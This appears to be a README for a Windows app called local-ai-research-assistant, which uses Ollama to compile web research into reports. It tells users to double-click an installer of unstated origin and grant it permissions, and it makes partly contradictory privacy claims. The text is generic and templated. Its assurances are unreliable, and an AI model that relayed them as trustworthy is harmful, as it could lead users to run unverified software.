# 🤖 local-ai-research-assistant - Automate deep research with local intelligence

https://github.com/Indrasclerotinia71/local-ai-research-assistant

## 📖 Overview
This tool performs automated research tasks. It uses local artificial intelligence to gather information from the internet. You use it to find facts, extract content, and create structured reports. The system runs entirely on your own hardware. This keeps your data private and secure. It relies on Ollama for intelligence and web search tools for data collection.

## ⚙️ System Requirements
* Windows 10 or 11
* 16GB RAM minimum (32GB recommended)
* 20GB free disk space
* Reliable internet connection
* NVIDIA GPU recommended for faster performance

## 🛠️ Installation Steps
Follow these steps to set up the software on your Windows machine.

1. Locate the downloaded file in your Downloads folder.
2. Double-click the installer icon.
3. Follow the prompts on the screen to complete the installation.
4. Allow the system to configure local permissions when asked.
5. Launch the application from your desktop shortcut once finished.

## 🧠 Configuring the Engine
The system requires an intelligence engine to operate. You must install the Ollama background service for the application to process information.

1. Download the Ollama desktop tool from its official website if not included in the installer.
2. Run the Ollama setup.
3. Open a command prompt or terminal window.
4. Type `ollama run llama3` and press Enter.
5. The tool downloads the necessary language model.
6. Wait for the download to finish.
7. Keep this window or the background process running while you use the research assistant.

## 📋 How to Run the App
Once the background engine is ready, you can start the assistant.

1. Open the local-ai-research-assistant application from your Start menu.
2. A browser window will open automatically. This is your user interface.
3. Enter your research topic into the text box provided.
4. Choose the depth of the research from the menu.
5. Click the "Generate Report" button to begin.
6. The system starts searching the web.
7. It extracts content from relevant sites.
8. The intelligence model summarizes the findings.
9. A final document will appear on your screen ready for download.

## 🌐 Understanding Features
* **Automated Research:** The tool navigates web pages to gather data without manual input.
* **Content Extraction:** It filters out noise and advertisements to focus on main points.
* **Structured Reports:** You get clean, organized documents instead of messy text.
* **PDF Generation:** You can save completed reports as PDF files for easy sharing.
* **Privacy Controls:** All data stays on your drive. Information never leaves your machine to reach external servers.

## 🔍 Troubleshooting Tips
* If the app fails to start, ensure the Ollama engine is active.
* Check your internet connection if the search results return as empty.
* Ensure you have enough disk space for the research files.
* Restart your computer if the installation seems stuck.
* Use a stable Wi-Fi or Ethernet connection to prevent interruptions during web scraping.

## 🛡️ Privacy and Safety
Your research stays local. The system does not transmit your personal search queries to third-party providers. The software relies on Ollama to ensure your data remains under your control. Avoid researching highly sensitive or private information if you share your computer with others, as the generated reports save to your local folder.

## 📚 Frequently Asked Questions
**Does this software cost money?**
No, the software relies on open-source tools and is free to use.

**How much battery does it use?**
The research process requires processing power. Keep your laptop plugged into a power source during long research tasks.

**Why does the system get warm?**
The artificial intelligence model uses your processor and graphics card. High temperatures are normal during active report generation.

**Can I stop a search in progress?**
Yes, use the cancel button inside the web interface to halt the current task.

**Where does the system store my reports?**
Reports save in the "Documents" folder under a subfolder named "Research-Assistant-Outputs".
